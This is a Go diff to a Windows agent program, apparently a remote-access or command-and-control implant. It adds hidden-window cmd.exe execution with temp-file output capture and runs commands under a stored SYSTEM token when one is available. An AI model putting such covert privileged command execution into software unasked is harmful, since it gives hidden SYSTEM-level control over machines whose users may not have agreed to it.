@@ -8,6 +8,7 @@ import (
 	"os/exec"
 	"runtime"
 	"syscall"
+	"time"
 	"unsafe"
 
 	"golang.org/x/sys/windows"
@@ -56,18 +57,55 @@ func makeInteractiveShellCmd(shell string) *exec.Cmd {
 	return c
 }
 
-// runShellSystemHook runs cmd as SYSTEM when gSystemToken is set.
-// Uses direct Win32 calls (same pattern as the C agent) to avoid Go's
-// exec layer, which relies on the process token for CreateProcessWithTokenW
-// privilege checks in some codepaths.
-func runShellSystemHook(cmd string) (out string, handled bool, err error) {
-	if gSystemToken == 0 {
-		return "", false, nil
+// shellDirect runs a shell command via cmd.exe and captures output to a temp file.
+// Unlike exec.Cmd with Stdout pipes, this approach prevents grandchild processes
+// started with 'start /b' from inheriting the pipe write handle, which would cause
+// the goroutine reading from the pipe to block indefinitely until the grandchild exits.
+func shellDirect(cmd string) string {
+	uid := fmt.Sprintf("%08x%016x", os.Getpid(), time.Now().UnixNano())
+	tmpDir := os.TempDir()
+	if len(tmpDir) > 0 && tmpDir[len(tmpDir)-1] != '\\' {
+		tmpDir += `\`
 	}
-	runtime.LockOSThread()
-	defer runtime.UnlockOSThread()
+	outPath := tmpDir + "sbo" + uid + ".tmp"
 
-	return shellDirectAsSystem(cmd, windows.Handle(gSystemToken)), true, nil
+	c := exec.Command("cmd.exe")
+	c.SysProcAttr = &windows.SysProcAttr{
+		CmdLine:    `/d /c ` + cmd + ` > "` + outPath + `" 2>&1`,
+		HideWindow: true,
+	}
+	// No Stdout/Stderr set — cmd.exe writes directly to the temp file.
+	// This prevents any grandchild processes from inheriting our pipe handles.
+
+	if err := c.Start(); err != nil {
+		_ = os.Remove(outPath)
+		return fmt.Sprintf("[error: shell: %v]", err)
+	}
+	done := make(chan error, 1)
+	go func() { done <- c.Wait() }()
+	select {
+	case <-done:
+	case <-time.After(60 * time.Second):
+		c.Process.Kill()
+		<-done
+	}
+	data, _ := os.ReadFile(outPath)
+	_ = os.Remove(outPath)
+	return string(data)
+}
+
+// runShellSystemHook runs cmd using temp-file redirection on Windows, optionally
+// via the stored SYSTEM token. Using temp files instead of pipes avoids handle
+// inheritance into grandchild processes (e.g. 'start /b agent.exe').
+func runShellSystemHook(cmd string) (out string, handled bool, err error) {
+	if gSystemToken != 0 {
+		runtime.LockOSThread()
+		defer runtime.UnlockOSThread()
+		return shellDirectAsSystem(cmd, windows.Handle(gSystemToken)), true, nil
+	}
+	// Non-SYSTEM case: always use temp-file approach on Windows to avoid
+	// pipe handle inheritance into background processes.
+	return shellDirect(cmd), true, nil
 }
 
 // shellDirectAsSystem creates a cmd.exe process using the supplied primary token
